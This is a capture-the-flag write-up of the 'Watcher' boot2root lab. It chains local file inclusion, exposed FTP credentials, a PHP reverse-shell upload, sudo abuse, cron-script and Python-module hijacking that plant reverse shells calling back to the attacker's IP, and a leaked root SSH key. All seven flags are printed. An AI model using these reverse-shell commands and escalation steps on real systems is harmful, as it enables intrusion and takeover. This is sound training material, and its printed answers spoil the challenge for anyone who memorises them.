# Watcher

A boot2root Linux machine utilising web exploits along with some common privilege escalation techniques.

# Flag 1

*Hint: https://moz.com/learn/seo/robotstxt*

Nmap reveals 3 services:

~~~
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e1:80:ec:1f:26:9e:32:eb:27:3f:26:ac:d2:37:ba:96 (RSA)
|   256 36:ff:70:11:05:8e:d4:50:7a:29:91:58:75:ac:2e:76 (ECDSA)
|_  256 48:d2:3e:45:da:0c:f0:f6:65:4e:f9:78:97:37:aa:8a (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Jekyll v4.1.1
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Corkplacemats
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
~~~

The FTP service doesn't allow anonymous access. Let's continue with the web service. There is a `robots.txt` file that discloses 2 locations:

~~~
kali@kali:/data/Watcher$ curl -s http://10.10.85.119/robots.txt
User-agent: *
Allow: /flag_1.txt
Allow: /secret_file_do_not_read.txt
~~~

The first location is the flag:

~~~
kali@kali:/data/Watcher$ curl -s http://10.10.85.119/flag_1.txt
FLAG{robots_dot_text_what_is_next}
~~~

Flag #1: `FLAG{robots_dot_text_what_is_next}`

# Flag 2

*Hint: https://www.netsparker.com/blog/web-security/local-file-inclusion-vulnerability/*

The other location in the `robots.txt` leads to a 403 error page, we'll check that later.

~~~
kali@kali:/data/Watcher$ curl -s http://10.10.85.119/secret_file_do_not_read.txt
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at 10.10.85.119 Port 80</address>
</body></html>
~~~

The web service hosts a CMS with 3 posts. The links are as follows:

* http://10.10.85.119/post.php?post=striped.php
* http://10.10.85.119/post.php?post=round.php
* http://10.10.85.119/post.php?post=bunch.php

It seems there is no control on the `post` parameter sent to the `post.php` script. Indeed, we can read arbitrary files:

~~~
kali@kali:/data/Watcher$ curl -s http://10.10.85.119/post.php?post=/etc/passwd

[REDACTED]

<div class="row">
 <div class="col-2"></div>
 <div class="col-8">
  root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
will:x:1000:1000:will:/home/will:/bin/bash
ftp:x:111:114:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
ftpuser:x:1001:1001:,,,:/home/ftpuser:/usr/sbin/nologin
mat:x:1002:1002:,#,,:/home/mat:/bin/bash
toby:x:1003:1003:,,,:/home/toby:/bin/bash
 </div>
</div>

</main>

<footer class="text-muted">
  <div class="container">
    <p class="float-right">
      <a href="#">Back to top</a>
    </p>
    <p>&copy; Corkplacemats 2020</p>
  </div>
</footer>
</html>
~~~

Let's try to read the other file listed in the `robots.txt` file:

~~~
kali@kali:/data/Watcher$ curl -s http://10.10.85.119/post.php?post=secret_file_do_not_read.txt

[REDACTED]

<div class="row">
 <div class="col-2"></div>
 <div class="col-8">
  Hi Mat,

The credentials for the FTP server are below. I've set the files to be saved to /home/ftpuser/ftp/files.

Will

----------

ftpuser:givemefiles777
 </div>
</div>

</main>

<footer class="text-muted">
  <div class="container">
    <p class="float-right">
      <a href="#">Back to top</a>
    </p>
    <p>&copy; Corkplacemats 2020</p>
  </div>
</footer>
</html>
~~~

The file contains credentials (`ftpuser:givemefiles777`) to connect to the FTP service. Let's connect:

~~~
kali@kali:/data/Watcher$ ftp 10.10.85.119
Connected to 10.10.85.119.
220 (vsFTPd 3.0.3)
Name (10.10.85.119:kali): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
~~~

The FTP service hosts a file and a directory (with write access).

~~~
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
dr-xr-xr-x    3 65534    65534        4096 Dec 03 01:58 .
dr-xr-xr-x    3 65534    65534        4096 Dec 03 01:58 ..
drwxr-xr-x    2 1001     1001         4096 Dec 03 03:30 files
-rw-r--r--    1 0        0              21 Dec 03 01:58 flag_2.txt
226 Directory send OK.
ftp> get flag_2.txt -
remote: flag_2.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for flag_2.txt (21 bytes).
FLAG{ftp_you_and_me}
226 Transfer complete.
21 bytes received in 0.00 secs (6.5772 kB/s)
~~~

Flag #2: `FLAG{ftp_you_and_me}`

# Flag 3

*Hint: https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-2*

From the previous secret, we are told that files are saved to `/home/ftpuser/ftp/files`, and we know that the FTP service allows file uploads. Let's upload a PHP reverse shell:

~~~
kali@kali:/data/Watcher/files$ ftp 10.10.85.119
Connected to 10.10.85.119.
220 (vsFTPd 3.0.3)
Name (10.10.85.119:kali): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd files
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 Dec 03 03:30 .
dr-xr-xr-x    3 65534    65534        4096 Dec 03 01:58 ..
226 Directory send OK.
ftp> put rev.php
local: rev.php remote: rev.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5492 bytes sent in 0.00 secs (59.5179 MB/s)
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 Apr 28 12:06 .
dr-xr-xr-x    3 65534    65534        4096 Dec 03 01:58 ..
-rw-r--r--    1 1001     1001         5492 Apr 28 12:06 rev.php
226 Directory send OK.
ftp> pwd
257 "/files" is the current directory
ftp> exit
221 Goodbye.
~~~

Now, let's exploit the LFI vulnerability to include our reverse shell:

~~~
kali@kali:/data/Watcher/files$ curl -s http://10.10.85.119/post.php?post=/home/ftpuser/ftp/files/rev.php
~~~

We now have a working shell:

~~~
kali@kali:/data/Watcher$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.8.50.72] from (UNKNOWN) [10.10.85.119] 53822
Linux watcher 4.15.0-128-generic #131-Ubuntu SMP Wed Dec 9 06:57:35 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 12:09:37 up 59 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@watcher:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
~~~

Let's search for the 3rd flag:

~~~
www-data@watcher:/home$ find / -type f -name flag_3.txt 2>/dev/null
find / -type f -name flag_3.txt 2>/dev/null
/var/www/html/more_secrets_a9f10a/flag_3.txt
www-data@watcher:/home$ cat /var/www/html/more_secrets_a9f10a/flag_3.txt
cat /var/www/html/more_secrets_a9f10a/flag_3.txt
FLAG{lfi_what_a_guy}
~~~

Flag #3: `FLAG{lfi_what_a_guy}`

# Flag 4

*Hint: https://www.explainshell.com/explain?cmd=sudo+-l*

The next flag is in `toby`'s home folder, and is only readable by `toby`:

~~~
www-data@watcher:/home$ find / -type f -name flag_4.txt -exec ls -l {} + 2>/dev/null
<ype f -name flag_4.txt -exec ls -l {} + 2>/dev/null
-rw------- 1 toby toby 21 Dec  3 01:58 /home/toby/flag_4.txt
~~~

Checking our privileges reveals that `www-data` can execute any command as `toby` using `sudo` without password:

~~~
www-data@watcher:/home$ sudo -l
sudo -l
Matching Defaults entries for www-data on watcher:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on watcher:
    (toby) NOPASSWD: ALL
~~~

Let's spawn a shell:

~~~
www-data@watcher:/home$ sudo -u toby /bin/bash
sudo -u toby /bin/bash
toby@watcher:/home$ cat /home/toby/flag_4.txt
cat /home/toby/flag_4.txt
FLAG{chad_lifestyle}
~~~

Flag #4: `FLAG{chad_lifestyle}`

# Flag 5

*Hint: https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs*

Only `mat` can read the next flag:

~~~
toby@watcher:/home$ find / -type f -name flag_5.txt -exec ls -l {} + 2>/dev/null
<ype f -name flag_5.txt -exec ls -l {} + 2>/dev/null
-rw------- 1 mat mat 37 Dec  3 01:58 /home/mat/flag_5.txt
~~~

There is a note in `toby`'s home that gives hints:

~~~
toby@watcher:~$ cat note.txt 
Hi Toby,

I've got the cron jobs set up now so don't worry about getting that done.

Mat
~~~

Indeed, there is a cron job that runs every minute, executed by `mat`:

~~~
www-data@watcher:/home$ cat /etc/crontab

[REDACTED]

*/1 * * * * mat /home/toby/jobs/cow.sh
~~~

The script is owned by `toby`, we can modify it:

~~~
toby@watcher:~$ ls -l /home/toby/jobs/cow.sh
-rwxr-xr-x 1 toby toby 46 Dec  3 03:31 /home/toby/jobs/cow.sh
~~~

Let's put a reverse shell that will be executed by `mat`:

~~~
$ cat > /home/toby/jobs/cow.sh << EOF
#!/bin/bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.50.72",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
EOF
~~~

One minute later, we have a shell and we can read the flag:

~~~
kali@kali:/data/vpn$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.8.50.72] from (UNKNOWN) [10.10.85.119] 53844
bash: cannot set terminal process group (3019): Inappropriate ioctl for device
bash: no job control in this shell
mat@watcher:~$ python3 -c "import pty;pty.spawn('/bin/bash')"
python3 -c "import pty;pty.spawn('/bin/bash')"
mat@watcher:~$ cd /home/mat
cd /home/mat
mat@watcher:~$ cat flag_5.txt
cat flag_5.txt
FLAG{live_by_the_cow_die_by_the_cow}
~~~

Flag #5: `FLAG{live_by_the_cow_die_by_the_cow}`

# Flag 6

*Hint: https://book.hacktricks.xyz/linux-unix/privilege-escalation#python-library-hijacking*

Flag #6 is owned by `will`:

~~~
mat@watcher:~$ find / -type f -name flag_6.txt -exec ls -l {} + 2>/dev/null
find / -type f -name flag_6.txt -exec ls -l {} + 2>/dev/null
-rw------- 1 will will 41 Dec  3 01:58 /home/will/flag_6.txt
~~~

The note in `mat`'s home tells us about scripts we can run with `sudo`:

~~~
mat@watcher:~$ cat /home/mat/note.txt
cat /home/mat/note.txt
Hi Mat,

I've set up your sudo rights to use the python script as my user. You can only run the script with sudo so it should be safe.

Will
~~~

Let's check our privileges:

~~~
mat@watcher:~$ sudo -l
sudo -l
Matching Defaults entries for mat on watcher:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mat may run the following commands on watcher:
    (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *
~~~

We can run the following script as `will`:

```python
mat@watcher:~$ cat /home/mat/scripts/will_script.py
import os
import sys
from cmd import get_command

cmd = get_command(sys.argv[1])

whitelist = ["ls -lah", "id", "cat /etc/passwd"]

if cmd not in whitelist:
	print("Invalid command!")
	exit()

os.system(cmd)
```

The above scripts includes the below function, from the `cmd.py` script:

```python
mat@watcher:~/scripts$ cat cmd.py
def get_command(num):
	if(num == "1"):
		return "ls -lah"
	if(num == "2"):
		return "id"
	if(num == "3"):
		return "cat /etc/passwd"
```

As we have write access to the `cmd.py` script, let's insert a python reverse shell:

```python
mat@watcher:~/scripts$ cat cmd.py
import socket,subprocess,os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.8.50.72",5555))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])

def get_command(num):
    if(num == "1"):
        return "ls -lah"
    if(num == "2"):
        return "id"
    if(num == "3"):
        return "cat /etc/passwd"
```

And now, call the main script as `will` with `sudo`:

~~~
$ sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 1
~~~

You should now have a reverse shell as `will`. Let's get the flag:

~~~
kali@kali:/data/Watcher/files$ rlwrap nc -nlvp 5555
listening on [any] 5555 ...
connect to [10.8.50.72] from (UNKNOWN) [10.10.85.119] 45636
$ python3 -c "import pty;pty.spawn('/bin/bash')"
will@watcher:~/scripts$ id
id
uid=1000(will) gid=1000(will) groups=1000(will),4(adm)
will@watcher:~/scripts$ cd /home/will
cd /home/will
will@watcher:/home/will$ cat flag_6.txt
cat flag_6.txt
FLAG{but_i_thought_my_script_was_secure}
~~~

Flag #6: `FLAG{but_i_thought_my_script_was_secure}`

# Flag 7

*Hint: https://explainshell.com/explain?cmd=ssh%20-i%20keyfile%20host*

Searching for flag #7 using `find` leads nowhere, probably because this is the root flag.

~~~
will@watcher:/home/will$ find / -type f -name flag_7.txt -exec ls -l {} + 2>/dev/null
<ype f -name flag_7.txt -exec ls -l {} + 2>/dev/null
~~~

Using `id`, we see that `will` is member of an `adm` group. Let's search for files owned by this group: 

~~~
will@watcher:/home/will$ id
id
uid=1000(will) gid=1000(will) groups=1000(will),4(adm)
will@watcher:/home/will$ find / -type f -group adm -exec ls -l {} + 2>/dev/null
<d / -type f -group adm -exec ls -l {} + 2>/dev/null
-rw-rw---- 1 root   adm    2270 Dec  3 02:04 /opt/backups/key.b64
-rw-r----- 1 root   adm   41152 Apr 28 12:01 /var/log/apache2/access.log
-rw-r----- 1 root   adm   11176 Apr 28 12:59 /var/log/apache2/error.log
-rw-r----- 1 root   adm       0 Dec  3 01:39 /var/log/apache2/other_vhosts_access.log
-rw-r----- 1 root   adm   28898 Dec 12 15:23 /var/log/apt/term.log
-rw-r----- 1 syslog adm   84878 Apr 28 13:57 /var/log/auth.log
-rw-r--r-- 1 syslog adm  637232 Apr 28 11:13 /var/log/cloud-init.log
-rw-r----- 1 syslog adm 1548107 Apr 28 11:13 /var/log/kern.log
-rw-r----- 1 syslog adm 1960650 Apr 28 13:57 /var/log/syslog
-rw-r--r-- 1 root   adm   43890 Dec 12 15:23 /var/log/unattended-upgrades/unattended-upgrades-dpkg.log
~~~

There is a base64 encoded file in `/opt/backups` that, once decoded, is a SSH private key, likely for `root`, as this is the final flag:

~~~
will@watcher:/home/will$ cat /opt/backups/key.b64 | base64 -d > /home/will/ssh.key
<pt/backups/key.b64 | base64 -d > /home/will/ssh.key
~~~

Transfer the SSH key to Kali, give it the proper privileges and connect as root.

~~~
kali@kali:/data/Watcher/files$ chmod 600 ssh.key 
kali@kali:/data/Watcher/files$ ssh -i ssh.key root@10.10.85.119
~~~

Now connected as `root`, we can get the final flag:

~~~
root@watcher:~# cd /root
root@watcher:~# ll
total 40
drwx------  6 root root 4096 Dec  3 02:32 ./
drwxr-xr-x 24 root root 4096 Dec 12 15:22 ../
lrwxrwxrwx  1 root root    9 Dec  3 02:32 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 Dec  3 01:42 .cache/
-rw-r--r--  1 root root   31 Dec  3 02:26 flag_7.txt
drwx------  3 root root 4096 Dec  3 01:42 .gnupg/
drwxr-xr-x  3 root root 4096 Dec  3 01:41 .local/
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   66 Dec  3 02:07 .selected_editor
drwx------  2 root root 4096 Dec  3 02:04 .ssh/
root@watcher:~# cat flag_7.txt 
FLAG{who_watches_the_watchers}
~~~

Flag #7: `FLAG{who_watches_the_watchers}`
